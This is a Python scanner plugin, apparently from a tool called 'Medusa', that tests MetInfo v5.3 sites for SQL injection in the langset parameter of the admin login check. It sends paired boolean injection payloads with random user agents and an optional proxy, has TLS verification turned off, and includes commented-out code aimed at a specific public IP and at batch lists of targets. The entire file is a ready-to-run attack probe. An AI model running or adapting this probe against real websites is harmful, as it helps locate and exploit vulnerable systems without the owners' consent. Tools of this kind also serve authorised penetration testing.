#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: metinfo v5.3sql注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0100846
author: Lucifer
description: metinfo /admin/login/login_check.php?langset=cn 的langset 参数没有过滤存在sql注入漏洞。
'''

import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payload="/admin/login/login_check.php?langset=cn%27AnD%271%27=%271"
payload2="/admin/login/login_check.php?langset=cn%27AnD%271%27=%272"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    global resp2
    payload_url = scheme + "://" + url + payload
    payload_url2 = scheme + "://" + url + payload2
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            resp2 = requests.get(payload_url2, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
            resp2 = requests.get(payload_url2, headers=headers, timeout=5, verify=False)
        con = resp.text
        con2 = resp2.text
        if con2.lower().find('not have this language')!=-1 and con.lower().find('not have this language')!=-1:
            Medusa = "{} 存在metinfo v5.3 SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass
#if __name__ == '__main__':
    # with open('1.txt', 'r') as f:
    #     for ip in f.readlines():
    #         ip = ip.strip()
    #         audit(assign('WWW', str(ip))[1])
    #medusa('54.37.131.33:8888',"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",'')